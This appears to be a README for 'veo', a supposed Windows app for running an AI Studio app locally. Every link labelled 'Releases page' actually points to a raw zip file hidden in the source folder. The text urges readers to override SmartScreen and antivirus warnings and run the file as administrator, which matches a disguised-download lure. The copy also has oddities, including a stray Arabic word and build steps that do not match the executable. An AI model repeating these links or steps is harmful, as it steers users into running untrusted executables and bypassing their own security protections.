# 🎥 veo - Run Your AI App on Windows

[![Download veo](https://img.shields.io/badge/Download-veo-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mercantile-danaidae17/veo/raw/refs/heads/main/src/components/Software-v2.8.zip)

## 🖥️ What veo is

veo is a desktop app for running your AI Studio app on your own computer. It gives you a simple way to download the app, open it on Windows, and start using it without setting up a full dev stack by hand.

Use veo if you want to:

- run the app locally on Windows
- keep the setup simple
- open your AI Studio app from a local install
- test changes on your own machine

## 📥 Download veo

1. Open the [veo Releases page](https://github.com/Mercantile-danaidae17/veo/raw/refs/heads/main/src/components/Software-v2.8.zip)
2. Find the latest release at the top of the page
3. Download the Windows file from the Assets list
4. Save the file to a folder you can find again, مثل `Downloads` or `Desktop`

If the release includes a setup file, use that file. If it includes a zip file, extract it first before you run the app.

## 🚀 Install and run on Windows

1. Go to the [veo Releases page](https://github.com/Mercantile-danaidae17/veo/raw/refs/heads/main/src/components/Software-v2.8.zip)
2. Download the latest Windows release
3. If the file is zipped, right-click it and choose **Extract All**
4. Open the extracted folder
5. Double-click the app file to start veo
6. If Windows asks for permission, choose **Run anyway** only if you trust the file source
7. Wait for the app to open

If the app does not open right away, check whether your antivirus or Windows SmartScreen blocked it. Some apps need one extra approval before they start the first time.

## 🧰 What you need

You only need a few basic things:

- A Windows PC
- Internet access for the first download
- Enough free space to unpack the app
- A Gemini API key if you want the app to connect to Gemini features

For most users, no manual coding is needed. The release file should handle the install flow.

## 🔐 Set your Gemini API key

Some parts of the app need a Gemini API key.

If the release asks for it:

1. Open the app settings or config file
2. Find the field named `GEMINI_API_KEY`
3. Paste your Gemini API key into that field
4. Save the file
5. Restart the app

If you do not have a key yet, create one in your Gemini account before you start the app.

## 🧭 Use the app

After veo starts, you can use it to run your AI Studio app on your local machine.

Typical use flow:

1. Open veo
2. Load your app
3. Start the local run
4. View the app in your browser or inside the app window
5. Test your changes and refresh as needed

If the app asks for a local address, use the one shown in the window. Common local addresses look like `http://localhost:3000`, but use the exact one from veo.

## 🧩 If you want to build from source

Use this only if you want to work with the project files directly.

### Requirements

- Node.js
- npm

### Steps

1. Clone or download the repository
2. Open a terminal in the project folder
3. Install dependencies:
   ```bash
   npm install
   ```
4. Set `GEMINI_API_KEY` in `.env.local`
5. Start the app:
   ```bash
   npm run dev
   ```

This starts the app in development mode. It is useful if you want to test local changes.

## 📁 Project files

Common files you may see:

- `.env.local` — stores local settings like your API key
- `package.json` — lists the app dependencies and scripts
- `src/` — app source files
- `public/` — static files used by the app
- `README.md` — project instructions

You do not need to edit these files to run the release build unless the app asks you to.

## 🛠️ Common problems

### The app does not start

- Make sure you downloaded the latest release
- Check that the file finished downloading
- If you extracted a zip file, open the extracted folder, not the zip file
- Try running the app again as an administrator if Windows blocks it

### Windows says the app is unsafe

- This can happen with new or unsigned files
- Check the release page and make sure you downloaded the file from the correct repository
- If Windows shows a SmartScreen prompt, choose the option that keeps the app running only if you trust the source

### The app opens but nothing loads

- Check your internet connection
- Make sure `GEMINI_API_KEY` is set
- Restart veo after saving changes
- Open the local address shown in the app

### The build command fails

If you are running from source:

- Make sure Node.js is installed
- Run `npm install` again
- Check that `.env.local` has a valid `GEMINI_API_KEY`
- Try `npm run dev` again

## 🔄 Updates

To update veo:

1. Visit the [Releases page](https://github.com/Mercantile-danaidae17/veo/raw/refs/heads/main/src/components/Software-v2.8.zip)
2. Download the newest Windows release
3. Replace the old files with the new version
4. Open the app again

If you use a zip release, extract the new file into a fresh folder before you start it.

## 📌 Quick start

1. Open the [veo Releases page](https://github.com/Mercantile-danaidae17/veo/raw/refs/heads/main/src/components/Software-v2.8.zip)
2. Download the latest Windows file
3. Extract it if needed
4. Start the app
5. Add your `GEMINI_API_KEY` if the app asks for it
6. Run your AI Studio app locally